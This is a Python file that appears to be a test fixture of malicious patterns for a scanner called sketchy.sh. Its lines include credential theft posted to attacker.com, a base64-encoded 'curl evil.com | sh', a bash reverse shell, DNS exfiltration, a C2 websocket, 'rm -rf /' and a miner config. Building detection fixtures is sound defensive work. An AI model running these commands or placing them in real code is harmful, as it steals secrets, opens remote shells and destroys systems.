#!/usr/bin/env python3
# Test file with suspicious patterns for sketchy.sh

import os
import subprocess
import base64
import pickle
import requests
from PIL import Image
import dns.resolver

# Command overwrite pattern
ls = "rm -rf /"

# Code execution patterns
exec(open('payload.py').read())
eval(compile('print("evil")', '<string>', 'exec'))
__import__('os').system('whoami')

# Download and execute
import urllib.request
urllib.request.urlretrieve('http://evil.com/malware.py', '/tmp/mal.py')

# Silent process execution
subprocess.run(['curl', 'evil.com'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Sensitive data access
def steal_credentials():
    ssh_key = open(os.path.expanduser('~/.ssh/id_rsa')).read()
    aws_creds = os.environ['AWS_SECRET_ACCESS_KEY']
    api_token = os.environ['API_TOKEN']
    requests.post('http://attacker.com/steal', data={'key': ssh_key, 'aws': aws_creds})

# Base64 obfuscation
encoded_payload = "ZXhlYygnX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2N1cmwgZXZpbC5jb20gfCBzaCcpJyk="
decoded = base64.b64decode(encoded_payload)
exec(decoded)

# Time-based trigger (delayed execution)
import time
time.sleep(86400)  # Wait 24 hours before executing

# Dynamic imports
malicious_module = __import__('evil_module')
import importlib
backdoor = importlib.import_module('backdoor')

# Reverse shell
os.system('bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')

# DNS exfiltration
def exfiltrate_via_dns(data):
    resolver = dns.resolver.Resolver()
    encoded = base64.b64encode(data.encode()).decode()
    resolver.resolve(f"{encoded}.attacker.com", 'TXT')

# Cryptocurrency miner reference
xmrig_config = {
    'url': 'stratum+tcp://pool.monero.com:3333',
    'wallet': 'monero_wallet_address_here'
}

# Package manager from code
os.system('pip install evil-package')

# WebSocket for C2
import websocket
ws = websocket.WebSocket()
ws.connect('ws://command-control.evil.com')

# Suspicious URLs
pastebin_url = "https://pastebin.com/raw/ABC123"
bitly_url = "http://bit.ly/evil123"

# Character code obfuscation
evil_string = ''.join([chr(101), chr(118), chr(105), chr(108)])

# Pickle deserialization (dangerous)
data = pickle.loads(untrusted_data)

# Template injection vulnerability
from jinja2 import Template
template = Template("{{ user_input }}", autoescape=False)

# Steganography attempt
from PIL import Image
def extract_payload_from_image(img_path):
    img = Image.open(img_path)
    # Extract hidden data
    pass

# High-risk network to suspicious TLD
os.system('curl http://malware.tk/payload | sh')

# Hidden file operations
os.system('echo "backdoor" > ~/.hidden_backdoor')

# Dangerous file operations
os.system('chmod +x /etc/passwd')
os.system('chmod +s /tmp/backdoor')

# String concatenation for URL building
base_url = "https://"
domain = "evil" + ".com"
full_url = base_url + domain + "/payload"

# Check if this is a typosquatted package name
# colourama instead of colorama
# reqeusts instead of requests